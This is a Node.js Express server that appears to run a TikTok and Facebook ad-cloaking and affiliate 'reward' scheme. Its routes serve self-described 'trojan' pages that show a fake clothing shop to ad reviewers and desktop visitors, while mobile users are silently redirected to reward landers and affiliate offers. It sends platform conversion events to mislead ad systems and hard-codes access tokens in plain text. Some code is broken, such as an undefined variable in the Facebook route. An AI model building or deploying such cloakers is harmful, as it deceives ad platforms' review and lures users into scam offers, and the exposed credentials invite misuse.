const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');
const multer = require('multer');
const xlsx = require('xlsx');
const axios = require('axios');
const WebSocket = require('ws');
const http = require('http');
const crypto = require('crypto');
const vhost = require('vhost');


// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// HOUDINI AUTH ENDPOINT
app.get('/houdini/auth', (req, res) => {
  const authCode = req.query.auth_code;
  const extensionId = 'eadalfbnnmljlceffgpkinkflmbnnabi';
  if (authCode) { res.redirect(`chrome-extension://${extensionId}/redirect.html?auth_code=${authCode}`); }
  else { res.status(400).send('Authorization code not found'); }
});

// ALEXI 5.0

app.get('/v5.0/:lid', (req, res) => {
  const { lid } = req.params;
  const filePath = path.join(__dirname, 'public', 'wps', `${lid}.html`);
  fs.readFile(filePath, 'utf-8', (err, content) => {
    if (err) {
      console.error('Error reading file:', err);
      return res.status(404).send('File not found');
    }
    res.send(content);
    console.log(`Served ${lid} Trojan (${lid})`);
  });
});

// ALEXI 5.0 HERMES (SHEIN)
const v5_TIKTOK_API_URL = 'https://business-api.tiktok.com/open_api/v1.3/event/track/';
const v5_ACCESS_TOKEN = '843718bac7140f0c2addd7c4f9bea0c7ae8d0edb';
const v5_EVENT_SOURCE_ID = 'CQLVS3RC77U2FD1JIMDG';
const v5_DOMAIN = 'https://tokreward.com';
const v5_LANDER = (s1 = '', ttclid = '') => `${v5_DOMAIN}/afsheinpix.html${s1 || ttclid ? `?${s1 ? `s1=${s1}` : ''}${s1 && ttclid ? '&' : ''}${ttclid ? `ttclid=${ttclid}` : ''}` : ''}`;
const v5_OFFER = (s1, ttclid) => `https://t.afftrackr.com/?oex3=z%2f18zbE8uIUjW1ZpdU6xlAqhXdjym43%2fvQJDRoz7h5U%3d&s1=${s1}&s5=${ttclid}`;

    // Functions
const extractSingleIP = (ipString) => {
    if (!ipString) return null;
    const ips = ipString.split(',');
    return ips[0].trim();
};
const hashValue = (value) => {
    return crypto.createHash('sha256').update(value).digest('hex');
};

// Payload Creation
const createPayload = (event, ttclid, req, additionalProps = {}) => {
    const ipString = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ip = extractSingleIP(ipString);
    const user_agent = req.headers['user-agent'];
    const event_time = Math.floor(Date.now() / 1000);
    const external_id = hashValue(ttclid);
    return {
        event_source: "web",
        event_source_id: v5_EVENT_SOURCE_ID,
        data: [{
            event: event,
            event_time: event_time,
            user: {
                ttclid: ttclid,
                external_id: external_id,
                ip: ip,
                user_agent: user_agent
            },
            properties: {
                contents: [{
                    content_id: '216897'
                }],
                ...additionalProps
            }
        }]
    };
};

    // Sending Payloads to TT API
const sendEventToTikTok = async (payload) => {
    try {
        const response = await axios.post(v5_TIKTOK_API_URL, payload, {
            headers: {
                'Access-Token': v5_ACCESS_TOKEN,
                'Content-Type': 'application/json'
            }
        });
        return response.data;
    } catch (error) {
        console.error('Error sending event to TikTok:', error);
        throw error;
    }
};
    // Payout Formatting
const formatPayout = (payout) => {
    const floatValue = parseFloat(payout);
    if (isNaN(floatValue)) {
        console.error('Invalid payout value:', payout);
        return '0.00';
    }
    return floatValue.toFixed(2);
};

  // Route Handlers
 // Test Events
const handleTestEvent = async (req, res) => {
    const { s1, ttclid } = req.query;
    const ipString = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ip = extractSingleIP(ipString);
    const user_agent = req.headers['user-agent'];
    const event_time = Math.floor(Date.now() / 1000);
    const external_id = hashValue(ttclid);

    const payload = {
        event_source: "web",
        event_source_id: v5_EVENT_SOURCE_ID,
        test_event_code: "TEST52683",
        data: [{
            event: "ViewContent",
            event_time: event_time,
            user: {
                ttclid: ttclid,
                external_id: external_id,
                ip: ip,
                user_agent: user_agent
            },
            properties: {
                contents: [{
                    content_id: '216897'
                }],
                currency: "USD",
                value: "0.00"
            }
        }]
    };
    console.log('Payload:', JSON.stringify(payload, null, 2));
    try {
        const response = await sendEventToTikTok(payload);
        console.log(`Test Event Sent. ${ttclid} ${s1}`, response);
        res.sendStatus(200);
    } catch (error) {
        console.error('Error sending test event:', error);
        res.sendStatus(200);
    }
};

// Entry Endpoint
const handleEntry = async (req, res) => {
    const { s1, ttclid } = req.query;
    if (!s1 || !ttclid) {
        return res.redirect(v5_LANDER());
    }
    const payload = createPayload("ViewContent", ttclid, req);
    try {
        await sendEventToTikTok(payload);
        console.log(`LPV Posted (${s1})`);
        res.redirect(v5_LANDER(s1, ttclid));
    } catch (error) {
        console.error('Error making ENTRY POST request', error);
        res.redirect(v5_LANDER('entryposterror'));
    }
};

const handleExit = async (req, res) => {
    const { s1, ttclid } = req.query;
    if (!s1 || !ttclid) {
        return res.redirect(v5_OFFER('pixelutmerror', ''));
    }
    const payload = createPayload("AddToCart", ttclid, req);
    try {
        await sendEventToTikTok(payload);
        console.log(`CTR Posted (${s1})`);
        res.redirect(v5_OFFER(s1, ttclid));
    } catch (error) {
        console.error('Error making exit POST request:', error);
        res.redirect(v5_OFFER(s1, ''));
    }
};

// CVR Handler Function
const handleCVR = async (req, res) => {
    const { s1, s4, ttclid, payout, tid } = req.query;
    const formattedPayout = formatPayout(payout);
    console.log(`Conversion data received: s1=${s1}, s4=${s4}, ttclid=${ttclid}, payout=${formattedPayout}, tid=${tid}`);
    try {
        if (ttclid) {
            const payload = createPayload("CompletePayment", ttclid, req, {
                currency: "USD",
                value: formattedPayout
            });
            try {
                await sendEventToTikTok(payload);
                console.log(`CVR Posted to TikTok: s1=${s1}, payout=${formattedPayout}, ttclid=${ttclid}`);
            } catch (tiktokError) {
                console.error('Error sending CVR to TikTok API:', tiktokError);
            }
        }
        // Forward CVR postback to MaxConv
        if (s4) {
            const postbackUrl = `https://klcxb6.mcattr.com/conv?clid=${s4}&payout=${formattedPayout}&txid=${tid}`;
            try {
                const response = await axios.get(postbackUrl);
                console.log(`Postback sent to MaxConv: s4=${s4}, payout=${formattedPayout}, tid=${tid}`);
            } catch (postbackError) {
                console.error('Error sending postback to MaxConv:', postbackError);
            }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('Error processing conversion data:', error);
        res.sendStatus(200);
    }
};

// Routes
app.get('/api/v5/test', handleTestEvent);
app.get('/api/v5/entry', handleEntry);
app.get('/api/v5/exit', handleExit);
app.get('/api/v5/cvr', handleCVR);

// FACEBOOK HERMES V1.0



// (MAXCONV) -> ENTRY POINT
app.get('/api/fb/OFFER/v1/entry', async (req, res) => {
    const { s1, fbclid } = req.query;
    const ipString = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ip = extractSingleIP(ipString);
    const user_agent = req.headers['user-agent'];
    const event_time = Math.floor(Date.now() / 1000);
    const external_id = hashValue(ttclid);

    const pixel_id = "330548943457573";
    const token = "EAAwZBEMT60ZA0BOw3uvzdPjIcJClcdSx7MtjrUz4pe46Eon5kR7p1NZBJ0ZBPB83NXpBa2ps9nBWuhLqf3a4ddur3vNVYDzGn2vSbGOEJZBKg5HF5JGA6L9d9UK4UI6ZB3M26298WPZCZABdrr4VzDFHeAT4MHtfJ5FGsF6MBa76ZBGlkzez0O1jayZCZCX0WtpkdUXMAZDZD";
  
    const payload = [
      {
        event_name: "ViewContent",
        event_time: event_time,
        event_id: "event_id",
        event_source_url: "https:\/\/realrewardshub.com",
        user_data: {
          client_ip_address: ip,
          client_user_agent: user_agent,
          external_id: external_id,
          fbc: fbclid
        }
        
      }
    ]
    
try {
    const response = await axios.post(`https://graph.facebook.com/{API_VERSION}/${pixel_id}/events?access_token=${token}`, payload, {
        headers: {
            'Access-Token': '601495a1fb57efe0e5c313a6c9b0c92055bf35db',
            'Content-Type': 'application/json'
        }
    });

    console.log(`LPV Posted (${s1})`);
    res.redirect(`https://tok-reward.com/trbeta.html?s1=${s1}&ttclid=${ttclid}`);
} catch (error) {
    console.error('Error making entry POST request', error);
    res.redirect(`https://tok-reward.com/trbeta.html?s1=entryposterror`);
}
});



// V4 KIT
// Middleware to extract subdomain
function extractSubdomain(req, res, next) {
  const host = req.hostname;
  const subdomain = host.split('.')[0]; // Extract the subdomain
  req.subdomain = subdomain;
  next();
}

// Function to encode to Base64
const base64Encode = (str) => {
  return Buffer.from(str).toString('base64');
};

// TRAPI V1

// TRAPI Beta (Shein)

    // Test Pixel Events
app.get('/api/test/v1', async (req, res, next) => {
    const { s1, ttclid } = req.query;
    const ipString = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ip = extractSingleIP(ipString);
    const user_agent = req.headers['user-agent'];
    const event_time = Math.floor(Date.now() / 1000);
    const external_id = hashValue(ttclid);
    const payload = {
        event_source: "web",
        event_source_id: "CP7L7DRC77U9TBFP95HG",
        test_event_code: "TEST47787",
        data: [
            {
                event: "ViewContent",
                event_time: event_time,
                user: {
                    ttclid: ttclid,
                    external_id: external_id,
                    ip: ip,
                    user_agent: user_agent

                },
                page: {
                    url: "https://testing.com"
                }
            }
        ]
    };
    console.log('Payload:', JSON.stringify(payload, null, 2)); // Log the payload
    try {
        const response = await axios.post('https://business-api.tiktok.com/open_api/v1.3/event/track/', payload, {
            headers: {
                'Access-Token': '601495a1fb57efe0e5c313a6c9b0c92055bf35db',
                'Content-Type': 'application/json'
            }
        });
        console.log(`Test Event Sent. ${ttclid} ${s1}`, response.data);
    } catch (error) {
        console.error('Error TESTING POST request:', error);
    }
});

// Middleware to cloak TRAPI Beta Traffic
app.get('/trapi/:s1', (req, res, next) => {
    const { s1 } = req.params;
    const { ttclid } = req.query;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const ttclid = urlParams.get("ttclid");
                const s1 = "${s1}";
                const destination = \`https://tok-reward.com/api/shein/v1/entry?s1=\${s1}&ttclid=\${ttclid}\`;
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = destination;
                    } else {
                    }
            </script>
            <title>${s1}'s New Shop</title>
        </head>
        <body>
            <h1>Welcome to ${s1} Famous Clothing Shop!</h1>
            <p>We hope you find everything you need at ${s1}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served TRAPI Trojan (${s1})`);
});

// Middleware to receive TRAPI Beta Traffic (ENTRY)
app.get('/api/shein/v1/entry', async (req, res) => {
    const { s1, ttclid } = req.query;
    if (!s1 || !ttclid) {
        return res.redirect(`https://tok-reward.com/trbeta.html`);
    }
    const ipString = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ip = extractSingleIP(ipString);
    const user_agent = req.headers['user-agent'];
    const event_time = Math.floor(Date.now() / 1000);
    const external_id = hashValue(ttclid);

    const payload = {
        event_source: "web",
        event_source_id: "CP7L7DRC77U9TBFP95HG",
        data: [
            {
                event: "ViewContent",
                event_time: event_time,
                user: {
                    ttclid: ttclid,
                    external_id: external_id,
                    ip: ip,
                    user_agent: user_agent

                },
                properties: {
                    content_type: "product",
                    currency: "USD"
                },
                page: {
                    url: "https://tok-reward.com"
                }
            }
        ]
    };
    
    try {
        const response = await axios.post('https://business-api.tiktok.com/open_api/v1.3/event/track/', payload, {
            headers: {
                'Access-Token': '601495a1fb57efe0e5c313a6c9b0c92055bf35db',
                'Content-Type': 'application/json'
            }
        });

        console.log(`LPV Posted (${s1})`);
        res.redirect(`https://tok-reward.com/trbeta.html?s1=${s1}&ttclid=${ttclid}`);
    } catch (error) {
        console.error('Error making entry POST request', error);
        res.redirect(`https://tok-reward.com/trbeta.html?s1=entryposterror`);
    }
});


// Middleware to receive TRAPI Beta Traffic (EXIT)
app.get('/api/shein/v1/exit', async (req, res) => {
    const { s1, ttclid } = req.query;
    if (!s1 || !ttclid) {
        return res.redirect('https://glitchy.go2cloud.org/aff_c?offer_id=477&aff_id=2159');
    }
    const ipString = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ip = extractSingleIP(ipString);
    const user_agent = req.headers['user-agent'];
    const event_time = Math.floor(Date.now() / 1000);
    const external_id = hashValue(ttclid);

   const payload = {
        event_source: "web",
        event_source_id: "CP7L7DRC77U9TBFP95HG",
        data: [
            {
                event: "AddToCart",
                event_time: event_time,
                user: {
                    ttclid: ttclid,
                    external_id: external_id,
                    ip: ip,
                    user_agent: user_agent

                },
                properties: {
                    content_type: "product",
                    currency: "USD"
                },
                page: {
                    url: "https://tok-reward.com"
                }
            }
        ]
    };

    try {
        const response = await axios.post('https://business-api.tiktok.com/open_api/v1.3/event/track/', payload, {
            headers: {
                'Access-Token': '601495a1fb57efe0e5c313a6c9b0c92055bf35db',
                'Content-Type': 'application/json'
            }
        });

        console.log(`CTR Posted (${s1})`);
        res.redirect(`https://glitchy.go2cloud.org/aff_c?offer_id=477&aff_id=2159&source=${s1}`);
    } catch (error) {
        console.error('Error making exit POST request:', error);
        res.redirect(`https://glitchy.go2cloud.org/aff_c?offer_id=477&aff_id=2159&source=${s1}`);
    }
});


// Middleware to handle requests to /:offer/:slug
app.get('/:offer/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://rewards-for-all.com/${offer}.html`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to the ${slug} WebShop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
});

// Wrap the main app with vhost middleware to handle wildcard subdomains
const mainApp = express();
mainApp.use(vhost('*.tok-reward.com', app));

// Create HTTP server
const server = http.createServer(app);

// Create WebSocket server
const wss = new WebSocket.Server({ server });

// Broadcast to all connected clients
wss.broadcast = function broadcast(data) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(data);
        }
    });
};

// Log server console and broadcast to WebSocket clients
const log = console.log;
console.log = function (...args) {
    log.apply(console, args);
    const message = args.join(' ');
    wss.broadcast(message);
};

// Start the HTTP server
const PORT = 8080;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

